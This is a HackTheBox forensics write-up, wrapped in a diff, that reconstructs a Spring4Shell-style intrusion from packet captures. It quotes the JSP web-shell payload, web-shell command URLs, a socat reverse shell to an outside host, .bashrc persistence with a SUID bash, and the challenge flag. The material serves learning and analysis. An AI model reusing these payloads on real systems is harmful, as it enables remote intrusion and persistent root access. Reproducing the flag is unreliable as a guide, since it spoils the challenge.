@@ -1,0 +1,116 @@
+<h1 id="wrong-spooky-season"><a aria-hidden="true" class="anchor-heading icon-link" href="#wrong-spooky-season"></a>Wrong Spooky Season</h1>
+<ul>
+<li>
+<p>Looking for XSS:</p>
+<pre class="language-text"><code class="language-text">http.content_type == "application/x-www-form-urlencoded"
+</code></pre>
+<p>Returned 3 packets: 335, 353, and 387.</p>
+<p>Packet #353 is the most interesting, it has a data length of 775:</p>
+<pre class="language-text"><code class="language-text">class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&#x26;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&#x26;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&#x26;class.module.classLoader.resources.context.parent.pipeline.first.prefix=e4d1c32a56ca15b3&#x26;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+</code></pre>
+</li>
+<li>
+<p>Ran lots of requests with Python:</p>
+<pre class="language-text"><code class="language-text">http.user_agent == "python-requests/2.28.1"
+</code></pre>
+</li>
+<li>
+<p>The <code>.jsp</code> file is a reverse shell:</p>
+<pre class="language-text"><code class="language-text">http.request.uri contains ".jsp"
+</code></pre>
+</li>
+<li>
+<p>Command execution in packet 416 via JSP:</p>
+<pre class="language-text"><code class="language-text">http://192.168.1.166:8080/e4d1c32a56ca15b3.jsp?cmd=whoami
+</code></pre>
+<p>Returned that the user is <code>root</code> in packet 418.</p>
+<p>Confirmed additionally in #426/428, which executed and got the response of <code>id</code>.</p>
+</li>
+<li>
+<p>Installed <code>socat</code> on the machine in packet 436:</p>
+<pre class="language-text"><code class="language-text">http://192.168.1.166:8080/e4d1c32a56ca15b3.jsp?cmd=apt%20-y%20install%20socat
+</code></pre>
+<p>Confirmed successful in packet 456.</p>
+</li>
+<li>
+<p>Ran <code>socat</code> in packet 464:</p>
+<pre class="language-text"><code class="language-text">http://192.168.1.166:8080/e4d1c32a56ca15b3.jsp?cmd=socat%20TCP:192.168.1.180:1337%20EXEC:bash
+</code></pre>
+</li>
+<li>
+<p>Following the TCP packets after 464, the commands were:</p>
+<ul>
+<li>
+<p><code>id</code>: <code>uid=0(root) gid=0(root) groups=0(root)</code></p>
+</li>
+<li>
+<p><code>groups</code>: <code>root</code></p>
+</li>
+<li>
+<p><code>uname -r</code>: <code>5.18.0-kali7-amd64</code></p>
+</li>
+<li>
+<p><code>cat /etc/passwd</code>:</p>
+<pre class="language-log"><code class="language-log">root<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">:</span>root<span class="token operator">:</span><span class="token file-path string">/root</span><span class="token operator">:</span><span class="token file-path string">/bin/bash</span>
+daemon<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span>daemon<span class="token operator">:</span><span class="token file-path string">/usr/sbin</span><span class="token operator">:</span><span class="token file-path string">/usr/sbin/nologin</span>
+bin<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">2</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">:</span>bin<span class="token operator">:</span><span class="token file-path string">/bin</span><span class="token operator">:</span><span class="token file-path string">/usr/sbin/nologin</span>
+sys<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">3</span><span class="token operator">:</span><span class="token number">3</span><span class="token operator">:</span>sys<span class="token operator">:</span><span class="token file-path string">/dev</span><span class="token operator">:</span><span class="token file-path string">/usr/sbin/nologin</span>
+sync<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">4</span><span class="token operator">:</span><span class="token number">65534</span><span class="token operator">:</span>sync<span class="token operator">:</span><span class="token file-path string">/bin</span><span class="token operator">:</span><span class="token file-path string">/bin/sync</span>
+games<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">5</span><span class="token operator">:</span><span class="token number">60</span><span class="token operator">:</span>games<span class="token operator">:</span><span class="token file-path string">/usr/games</span><span class="token operator">:</span><span class="token file-path string">/usr/sbin/nologin</span>
+man<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">6</span><span class="token operator">:</span><span class="token number">12</span><span class="token operator">:</span>man<span class="token operator">:</span><span class="token file-path string">/var/cache/man</span><span class="token operator">:</span><span class="token file-path string">/usr/sbin/nologin</span>
+lp<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">7</span><span class="token operator">:</span><span class="token number">7</span><span class="token operator">:</span>lp<span class="token operator">:</span><span class="token file-path string">/var/spool/lpd</span><span class="token operator">:</span><span class="token file-path string">/usr/sbin/nologin</span>
+mail<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">8</span><span class="token operator">:</span><span class="token number">8</span><span class="token operator">:</span>mail<span class="token operator">:</span><span class="token file-path string">/var/mail</span><span class="token operator">:</span><span class="token file-path string">/usr/sbin/nologin</span>
+news<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">9</span><span class="token operator">:</span><span class="token number">9</span><span class="token operator">:</span>news<span class="token operator">:</span><span class="token file-path string">/var/spool/news</span><span class="token operator">:</span><span class="token file-path string">/usr/sbin/nologin</span>
+uucp<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">10</span><span class="token operator">:</span>uucp<span class="token operator">:</span><span class="token file-path string">/var/spool/uucp</span><span class="token operator">:</span><span class="token file-path string">/usr/sbin/nologin</span>
+proxy<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">13</span><span class="token operator">:</span><span class="token number">13</span><span class="token operator">:</span>proxy<span class="token operator">:</span><span class="token file-path string">/bin</span><span class="token operator">:</span><span class="token file-path string">/usr/sbin/nologin</span>
+www<span class="token operator">-</span>data<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">33</span><span class="token operator">:</span><span class="token number">33</span><span class="token operator">:</span>www<span class="token operator">-</span>data<span class="token operator">:</span><span class="token file-path string">/var/www</span><span class="token operator">:</span><span class="token file-path string">/usr/sbin/nologin</span>
+backup<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">34</span><span class="token operator">:</span><span class="token number">34</span><span class="token operator">:</span>backup<span class="token operator">:</span><span class="token file-path string">/var/backups</span><span class="token operator">:</span><span class="token file-path string">/usr/sbin/nologin</span>
+list<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">38</span><span class="token operator">:</span><span class="token number">38</span><span class="token operator">:</span>Mailing List Manager<span class="token operator">:</span><span class="token file-path string">/var/list</span><span class="token operator">:</span><span class="token file-path string">/usr/sbin/nologin</span>
+irc<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">39</span><span class="token operator">:</span><span class="token number">39</span><span class="token operator">:</span>ircd<span class="token operator">:</span><span class="token file-path string">/run/ircd</span><span class="token operator">:</span><span class="token file-path string">/usr/sbin/nologin</span>
+gnats<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">41</span><span class="token operator">:</span><span class="token number">41</span><span class="token operator">:</span>Gnats Bug<span class="token operator">-</span>Reporting System <span class="token operator">(</span>admin<span class="token operator">)</span><span class="token operator">:</span><span class="token file-path string">/var/lib/gnats</span><span class="token operator">:</span><span class="token file-path string">/usr/sbin/nologin</span>
+nobody<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">65534</span><span class="token operator">:</span><span class="token number">65534</span><span class="token operator">:</span>nobody<span class="token operator">:</span><span class="token file-path string">/nonexistent</span><span class="token operator">:</span><span class="token file-path string">/usr/sbin/nologin</span>
+_apt<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">100</span><span class="token operator">:</span><span class="token number">65534</span><span class="token operator">:</span><span class="token operator">:</span><span class="token file-path string">/nonexistent</span><span class="token operator">:</span><span class="token file-path string">/usr/sbin/nologin</span>
+messagebus<span class="token operator">:</span>x<span class="token operator">:</span><span class="token number">101</span><span class="token operator">:</span><span class="token number">102</span><span class="token operator">:</span><span class="token operator">:</span><span class="token file-path string">/nonexistent</span><span class="token operator">:</span><span class="token file-path string">/usr/sbin/nologin</span>
+</code></pre>
+</li>
+<li>
+<p><code>find / -perm -u=s -type f 2>/dev/null</code>:</p>
+<pre class="language-log"><code class="language-log"><span class="token file-path string">/bin/su</span>
+<span class="token file-path string">/bin/umount</span>
+<span class="token file-path string">/bin/mount</span>
+<span class="token file-path string">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+<span class="token file-path string">/usr/lib/openssh/ssh-keysign</span>
+<span class="token file-path string">/usr/bin/newgrp</span>
+<span class="token file-path string">/usr/bin/chfn</span>
+<span class="token file-path string">/usr/bin/gpasswd</span>
+<span class="token file-path string">/usr/bin/passwd</span>
+<span class="token file-path string">/usr/bin/chsh</span>
+</code></pre>
+</li>
+<li>
+<p><code>echo 'socat TCP:192.168.1.180:1337 EXEC:sh' > /root/.bashrc &#x26;&#x26; echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null &#x26;&#x26; chmod +s /bin/bash</code></p>
+</li>
+<li>
+<p><code>ls -lh</code>:</p>
+<pre class="language-log"><code class="language-log">total <span class="token number">20K</span>
+drwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x <span class="token number">1</span> root root <span class="token number">4.0K</span> <span class="token date number">Oct 10</span> <span class="token number">17</span><span class="token operator">:</span><span class="token number">28</span> <span class="token punctuation">.</span>
+drwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x <span class="token number">1</span> root root <span class="token number">4.0K</span> <span class="token date number">Oct 10</span> <span class="token number">17</span><span class="token operator">:</span><span class="token number">28</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token operator">-</span>rwxrwx<span class="token separator comment">---</span> <span class="token number">1</span> root root <span class="token number">1.8K</span> <span class="token date number">Oct  8</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">04</span> <span class="token domain constant">pom.xml</span>
+drwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x <span class="token number">3</span> root root <span class="token number">4.0K</span> <span class="token date number">Oct 10</span> <span class="token number">17</span><span class="token operator">:</span><span class="token number">27</span> src
+drwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x <span class="token number">1</span> root root <span class="token number">4.0K</span> <span class="token date number">Oct 10</span> <span class="token number">17</span><span class="token operator">:</span><span class="token number">28</span> target
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<p>The flag is the reversed base64 string decoded:</p>
+<pre class="language-text"><code class="language-text">HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}
+</code></pre>
+<hr>
+<h2 id="tags"><a aria-hidden="true" class="anchor-heading icon-link" href="#tags"></a>Tags</h2>
+<ol>
+<li><a title="Private" href="https://wiki.dendron.so/notes/hfyvYGJZQiUwQaaxQO27q.html" target="_blank" class="private">hackthebox (Private)</a></li>
+<li><a title="Private" href="https://wiki.dendron.so/notes/hfyvYGJZQiUwQaaxQO27q.html" target="_blank" class="private">pcap (Private)</a></li>
+<li><a title="Private" href="https://wiki.dendron.so/notes/hfyvYGJZQiUwQaaxQO27q.html" target="_blank" class="private">wireshark (Private)</a></li>
+<li><a title="Private" href="https://wiki.dendron.so/notes/hfyvYGJZQiUwQaaxQO27q.html" target="_blank" class="private">forensics (Private)</a></li>
+</ol>
